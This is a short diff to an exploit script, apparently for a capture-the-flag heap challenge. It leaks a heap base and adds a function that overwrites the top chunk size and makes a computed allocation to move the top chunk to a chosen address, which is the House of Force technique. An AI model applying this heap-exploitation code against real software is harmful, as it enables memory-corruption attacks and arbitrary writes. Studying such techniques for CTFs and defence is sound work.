@@ -82,6 +82,12 @@ heap_info = u64( r.recvline().strip().ljust(8,'\0') )
 heap_base = heap_info - 0x80
 print('heap base : ',hex(heap_base) )
 
+def move_top_to_addr(heap_base,addr):
+    allocate(0x38,'b' * 0x30 + p64(0) + p64(0xffffffffffffffff) )
+    nb = addr - heap_base - 16
+    allocate(nb,'x'*8)#malloc a large bin size chunk, the unsoted bin chunk has been move to small bin
+
+#now move to 
 
 
 
